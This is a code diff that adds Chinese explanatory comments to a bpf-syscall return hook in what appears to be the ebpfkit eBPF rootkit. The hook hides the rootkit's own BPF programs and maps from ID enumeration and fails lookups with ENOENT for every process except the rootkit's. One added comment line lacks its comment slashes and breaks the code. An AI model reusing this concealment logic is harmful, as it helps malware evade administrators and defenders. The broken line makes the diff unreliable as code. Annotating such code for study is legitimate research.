@@ -94,6 +94,7 @@ SYSCALL_KPROBE3(bpf, int, cmd, void *, buf, size_t, size) {
     return handle_bpf(cmd, buf, size);
 }
 
+//函数作用：隐藏某些bpf程序和映射，实现了一个隐藏机制
 __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
     u64 pid_tgid = bpf_get_current_pid_tgid();
     struct bpf_syscall_t *bpf = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
@@ -106,7 +107,7 @@ __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
     struct bpf_task_fd_query_t query;
 
     switch (bpf->cmd) {
-        case BPF_PROG_GET_NEXT_ID:
+        case BPF_PROG_GET_NEXT_ID://获取下一个bpf程序的ID
             bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);
 
             // asked for our program, we hide it
@@ -136,13 +137,14 @@ __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
 
             break;
 
-        case BPF_PROG_GET_FD_BY_ID:
+        case BPF_PROG_GET_FD_BY_ID:处理通过 ID 获取 BPF 程序文件描述符的请求
             if (tgid == get_ebpfkit_pid())
                 return 0;
 
             // should be done at syscall enter
             bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);
 
+            //目标是被隐藏的程序，返回ENOENT错误
             next_id = bpf_map_lookup_elem(&bpf_programs, &get_next_id.prog_id);
             if (next_id != NULL) {
                 bpf_override_return(ctx, -ENOENT);
@@ -151,7 +153,7 @@ __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
 
             break;
 
-        case BPF_MAP_GET_NEXT_ID:
+        case BPF_MAP_GET_NEXT_ID://处理获取下一个BPF map映射的ID的请求
             bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);
 
             // asked for our map, we hide it
@@ -181,7 +183,7 @@ __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
 
             break;
 
-        case BPF_MAP_GET_FD_BY_ID:
+        case BPF_MAP_GET_FD_BY_ID://处理通过 ID 获取 BPF map 文件描述符的请求
             if (tgid == get_ebpfkit_pid())
                 return 0;
 
@@ -233,6 +235,7 @@ __attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
     return 0;
 }
 
+//监控bpf系统调用的返回值
 SYSCALL_KRETPROBE(bpf) {
     return handle_bpf_ret(ctx);
 }
